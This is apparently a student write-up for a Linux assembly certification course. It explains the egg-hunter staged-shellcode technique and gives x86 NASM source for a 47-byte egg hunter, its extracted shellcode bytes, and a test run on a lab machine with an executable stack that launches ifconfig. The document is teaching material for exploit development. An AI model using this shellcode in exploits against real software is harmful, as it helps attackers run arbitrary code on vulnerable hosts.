**Assignment 3**

	Shellcode for Egghunter  

**Introduction**

	In a normal buffer overflow scenario, the location of where the shellcode is placed is more or less static and/or could be referenced by using a register and the available size in the stack memory is enough to fit the shellcode.Consider a scenario where the available buffer size is too small to squeeze the entire shellcode

	A technique called egg hunting may help us out here. Accoring to corelan ,Egg hunting is a technique that can be categorized as “staged shellcode”, and it basically allows you to use a small amount of custom shellcode to find your actual (bigger) shellcode (the “egg”) by searching for the final shellcode in memory.  In other words, first a small amount of code is executed, which then tries to find the real shellcode and executes it.

	There are 3 conditions that are important in order for this technique to work

		1. You must be able to jump to (jmp, call, push/ret) & execute “some” shellcode.  The amount of available buffer space can be relatively small, because it will only contain the so-called “egg hunter”.  The egg hunter code must be available in a predictable location (so you can reliably jump to it & execute it)

		2. The final shellcode must be available somewhere in memory (stack/heap/…).

		3. You must “tag” or prepend the final shellcode with a unique string/marker/tag. The initial shellcode (the small “egg hunter”) will step through memory, looking for this marker. When it finds it, it will start executing the code that is placed right after the marker using a jmp or call instruction.  This means that you will have to define the marker in the egg hunter code, and also write it just in front of the actual shellcode.


	Good Reads :
			https://www.fuzzysecurity.com/tutorials/expDev/4.html
			https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
			http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
			http://r00tin.blogspot.com/2009/03/heap-only-egg-hunter.html


**Methodology**

	The x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on.

	The Egghunter code will be browsing through the pages to look for the marker / egg and use access function to see the pages are accessible or not . If we get a efault error for a page ,we can skip that  page and check the next page.Once a valid page is found we look for the egg/marker and jmp on the codepart of the egg/marker


	Access Function

		access() checks whether the calling process can access the file pathname.
		Refer : https://linux.die.net/man/2/access

		int access(const char *pathname, int mode);

		Parameters
			*pathname will be the addresslocation of the page we want to check
			The mode specifies the accessibility check(s) to be performed, and is either the value F_OK, or a mask consisting of the bitwise OR of one or more of R_OK, W_OK, and X_OK. F_OK tests.

	Incase of a access deny , and EFAULT will be returned ie (14)



	Our egg would be 0x41414141 and the egghunter will look for 0x41414141 + "/bin/bash -c ifconfig" shellcode through the memory.once found code will jump onto /bin/sh shellcode

	8bytes 0x4141414141414141 is considered because we dont wanna match the egghunter shellcode itself


		global _start



		section .text

		_start:

        		; initialization
        		xor ecx, ecx
        		mul ecx          		#will clear ecx,eax and edx register
        		xor ebx, ebx
        		xor esi, esi

		next_lpage:
        		or dx,0xfff                
        						#using logical or with 0xfff and a memory address allows us to increment page sizes by a multiple of 4095. so next page is acheived using address location or ed with 0xfff , 4095 and 
        							adding a 1
        						#the reason we cant just increment page sizes with 4096 is hex(4096) = 0x1000 cause a null byte to be added in the shellcode								

		next_incr:
        		inc edx         		#page increment

        						;access function  to check permission

        		xor eax,eax       		#clear eax
        		mov edi,0x41414141      	#edi contains the egg we are looking for .
        		mov al,0x21             	#EAX conatins 33 , access function call number
        							#cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 33
        							##define __NR_access              33


        		lea ebx,[edx+8]         	#load the address value contained in edx + 8  to ebx 
        		int 0x80                	#access call to check if the page is accessible
        		cmp al,0xf2

        							#after the function call eax contains the return value , in case of 		EFAULT (bad address) the value we are looking for is 14 , ie  cat /usr/include/asm-generic/errno-base.h

        							Since this is an error code it will actually be returned as a negative 14 thus in hex we get back 0xfffffff2  #2s compliment	

        							-14 

									0000 1110 
									1111 0001 + 
							                1 
									-------------- 
									1111 0010 
									F   2

        		jz next_lpage  			#incase of a efaul , jump to next page

        		cmp edi,[edx]  			#egg match find ?
        		jnz next_incr  			#if not advance memory

        		cmp edi,[edx+4]         #eggmatch twice ?
        		jnz next_incr			#if not advance page

        		lea esi,[edx+8]			#egg match twice , get the address location of the shellcode to be executed to esi
        		jmp esi				#jmp to location pointed by esi

**Practical**

Egg is 0x41414141 , the shellcode to be executed

	toor@ubuntu:~/Desktop/slae/Assignments/3$ ./compile.sh egg
 	Assembling with nasm
	Success, Now Linking
	Go Ahead, may the force be with you
	toor@ubuntu:~/Desktop/slae/Assignments/3$ objdump -d ./egg|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
		"\x31\xc9\xf7\xe1\x31\xdb\x31\xf6\x66\x81\xca\xff\x0f\x42\x31\xc0\xbf\x41\x41\x41\x41\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xe8\x3b\x3a\x75\xe9\x3b\x7a\x04\x75\xe4\x8d\x72\x08\xff\xe6"


	toor@ubuntu:~/Desktop/slae/Assignments/3$ nano poc.c
	toor@ubuntu:~/Desktop/slae/Assignments/3$ gcc -fno-stack-protector -z execstack poc.c -o shellcode
	toor@ubuntu:~/Desktop/slae/Assignments/3$ ./shellcode
	Size: 47 bytes.
	eth0    Link encap:Ethernet  HWaddr 00:0c:29:f5:aa:6c
         	inet addr:192.168.230.169  Bcast:192.168.230.255  Mask:255.255.255.0
          	inet6 addr: fe80::20c:29ff:fef5:aa6c/64 Scope:Link
          	UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          	RX packets:83289 errors:0 dropped:0 overruns:0 frame:0
          	TX packets:34547 errors:0 dropped:0 overruns:0 carrier:0
          	collisions:0 txqueuelen:1000
          	RX bytes:57571168 (57.5 MB)  TX bytes:6962937 (6.9 MB)
          	Interrupt:19 Base address:0x2000
		
	lo      Link encap:Local Loopback
          	inet addr:127.0.0.1  Mask:255.0.0.0
          	inet6 addr: ::1/128 Scope:Host
          	UP LOOPBACK RUNNING  MTU:65536  Metric:1
          	RX packets:6986 errors:0 dropped:0 overruns:0 frame:0
          	TX packets:6986 errors:0 dropped:0 overruns:0 carrier:0
          	collisions:0 txqueuelen:0
          	RX bytes:627379 (627.3 KB)  TX bytes:627379 (627.3 KB)

	toor@ubuntu:~/Desktop/slae/Assignments/3$




**Github Repo**

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1509
        	

